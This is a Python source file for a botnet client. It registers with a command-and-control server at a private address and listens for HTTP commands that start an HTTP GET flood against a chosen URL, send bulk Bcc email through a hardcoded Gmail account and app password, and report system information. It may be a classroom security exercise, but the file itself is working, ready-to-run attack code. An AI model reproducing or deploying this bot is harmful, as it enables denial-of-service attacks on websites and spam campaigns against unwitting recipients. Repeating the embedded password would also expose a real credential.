import atexit
import contextlib
import platform
import smtplib
import threading
import requests
import socket
import json

from http.server import BaseHTTPRequestHandler, HTTPServer
from email.mime.text import MIMEText


class Bot(BaseHTTPRequestHandler):
    """
    Http request handler of a bot.
    """

    status = {'action': 'Idle', 'target': None}  # status of the bot
    lock = threading.Lock()  # lock for thread-safe access to the shared attributes
    stop = threading.Event()  # event to stop the attacks
    user = "botnetsicurezza@gmail.com"  # email address from which send the email messages
    password = "cebqshlncuewhjso"  # password of the email

    def __response_body(self, func):
        """
        Send a http response with the result of a function as body in a json format.
        :param func: function to execute
        """
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(bytes(json.dumps(func()), "utf-8"))

    def do_GET(self):
        """
        Reply to a GET request for the following path:
            - /info: send the information about the software and hardware configurations of this bot.
            - /status: send the current status of this bot.
            - /stop: stop an attack if there is one running or else send a 406 error response.

        If another path is requested it send a 404 error response.
        """
        if self.path == '/info':
            self.__response_body(self.__info)

        elif self.path == '/status':
            self.__response_body(self.__status)

        elif self.path == '/stop':
            if self.status['action'] == 'Idle':
                self.send_response(406)
            else:
                with self.lock:
                    self.status['action'] = "Idle"
                    self.status['target'] = None
                self.send_response(200)
                self.stop.set()

            self.end_headers()

        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        """
        Reply to a POST request for the following path:
            - /start: start a Dos attack (if the bot is idle) to the given url.
            - /email: send an email message to all the given addresses.

        If another path is requested it send a 404 error response.
        """
        if self.path == '/start':
            with self.lock:
                action = self.status['action']
            if action == "Idle":
                self.__start_attack()
            else:
                self.send_response(403)
        elif self.path == '/email':
            self.__start_email()
        else:
            self.send_response(404)

        self.end_headers()

    def __start_email(self):
        """
        Read the http request, reply to it and start sending emails.
        :return:
        """
        length = int(self.headers['Content-Length'])
        payload = json.loads(self.rfile.read(length).decode('utf-8'))

        try:
            self.__email(payload['emails'], payload['subj'], payload['txt'])
            self.send_response(200)
        except smtplib.SMTPServerDisconnected:
            self.send_response(400)

    def __start_attack(self):
        """
        Read the http request and start to attack the given url if it is reachable, if it is not it respond with an
        error. It changes the status of the bot before start the attack thread.
        """
        length = int(self.headers['Content-Length'])
        payload = json.loads(self.rfile.read(length).decode('utf-8'))

        url = payload['url']

        try:
            res = requests.get(url)
            if res.status_code != 200:
                self.send_response(400)
                return
        except Exception:
            self.send_response(400)
            return

        self.stop.clear()

        with self.lock:
            self.status['action'] = "Attacking"
            self.status['target'] = url

        attack = threading.Thread(target=Bot.__attack, args=(self, url))
        attack.start()
        self.send_response(200)

    def __info(self):
        """
        Get the system info of the bot.
        :return: system info
        """
        return platform.uname()._asdict()

    def __status(self):
        """
        Access to the status of the bot in a thread safe manner.
        :return: bot status
        """
        with self.lock:
            return self.status

    def __attack(self, url):
        """
        Send http GET request to the given url until the attack is stopped by the CnC.
        :param url: resource to attack.
        """
        while not self.stop.is_set():
            print(f"Request sent to {url}, status code:{requests.get(url).status_code}")

    def __email(self, emails, subj, text):
        """
        Email all the recipients.
        :param emails: addresses of the recipients.
        :param subj: subject of the email.
        :param text: content of the message.
        """
        smtp_server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        user = self.user
        smtp_server.login(user, self.password)

        message = MIMEText(text)
        message['Subject'] = subj
        message['From'] = user
        message['Bcc'] = ', '.join(emails)

        smtp_server.send_message(message)
        smtp_server.quit()


CNC_ADDR = "10.0.2.15"  # '127.0.0.1'
CNC_PORT = 60000


def connect(port):
    """
    Connect to the CnC socket as a new bot and give it the port in which the bot is listening.
    :param port: port of the bot
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((CNC_ADDR, CNC_PORT))
        s.send(str(port).encode('utf-8'))


def disconnect():
    """
    Connect to the CnC socket as an old bot so the CnC will delete the bot from the list.
    """
    with contextlib.suppress(ConnectionRefusedError):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((CNC_ADDR, CNC_PORT))


if __name__ == '__main__':
    bot = HTTPServer(('', 0), Bot)  # create a http server with the bot request handler

    try:
        connect(bot.server_port)  # connect to the CnC as a new bot
        print("Connected to the Command & Control")
        atexit.register(disconnect)  # register the disconnect function as an exit handler
        bot.serve_forever()  # start the http server
    except ConnectionRefusedError as e:
        print("Cannot establish the connection to Command & Control")
    except KeyboardInterrupt as e:
        pass
    finally:
        print("Closing program...")
